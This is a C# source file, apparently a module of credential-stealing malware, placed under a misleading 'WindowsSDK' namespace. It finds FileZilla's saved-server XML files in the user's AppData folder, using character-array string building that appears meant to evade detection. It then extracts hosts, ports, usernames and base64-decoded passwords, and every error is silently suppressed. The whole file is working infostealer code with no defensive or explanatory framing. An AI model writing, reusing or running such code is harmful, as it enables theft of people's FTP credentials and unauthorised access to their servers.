using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using WindowsSDK.Objects.Browsers;

namespace WindowsSDK.Data.Credentials
{
    public class FileZilla
    {
        public static List<Account> Scan()
        {
            List<Account> list = new List<Account>();
            try
            {
                string path = string.Format(new string(new char[31]
                {
                    '{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
                    'l', 'l', 'a', '\\', 'r', 'e', 'c', 'e', 'n', 't',
                    's', 'e', 'r', 'v', 'e', 'r', 's', '.', 'x', 'm',
                    'l'
                }), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                string path2 = string.Format(new string(new char[29]
                {
                    '{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
                    'l', 'l', 'a', '\\', 's', 'i', 't', 'e', 'm', 'a',
                    'n', 'a', 'g', 'e', 'r', '.', 'x', 'm', 'l'
                }), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                if (File.Exists(path))
                {
                    list.AddRange(ScanCredentials(path));
                }
                if (File.Exists(path2))
                {
                    list.AddRange(ScanCredentials(path2));
                }
            }
            catch
            {
            }
            return list;
        }

        private static List<Account> ScanCredentials(string Path)
        {
            List<Account> list = new List<Account>();
            try
            {
                XmlTextReader reader = new XmlTextReader(Path);
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(reader);
                foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
                {
                    Account recent = GetRecent(childNode);
                    if (recent.URL != "UNKNOWN" && recent.URL != "UNKNOWN")
                    {
                        list.Add(recent);
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        private static Account GetRecent(XmlNode xmlNode)
        {
            Account account = new Account();
            try
            {
                foreach (XmlNode childNode in xmlNode.ChildNodes)
                {
                    if (childNode.Name == "Host")
                    {
                        account.URL = childNode.InnerText;
                    }
                    if (childNode.Name == "Port")
                    {
                        account.URL = account.URL + ":" + childNode.InnerText;
                    }
                    if (childNode.Name == "User")
                    {
                        account.Username = childNode.InnerText;
                    }
                    if (childNode.Name == "Pass")
                    {
                        account.Password = Encoding.UTF8.GetString(Convert.FromBase64CharArray(childNode.InnerText.ToCharArray(), 0, childNode.InnerText.Length));
                    }
                }
            }
            catch
            {
            }
            finally
            {
                account.URL = (string.IsNullOrEmpty(account.URL) ? "UNKNOWN" : account.URL);
                account.Username = (string.IsNullOrEmpty(account.Username) ? "UNKNOWN" : account.Username);
                account.Password = (string.IsNullOrEmpty(account.Password) ? "UNKNOWN" : account.Password);
            }
            return account;
        }
    }
}
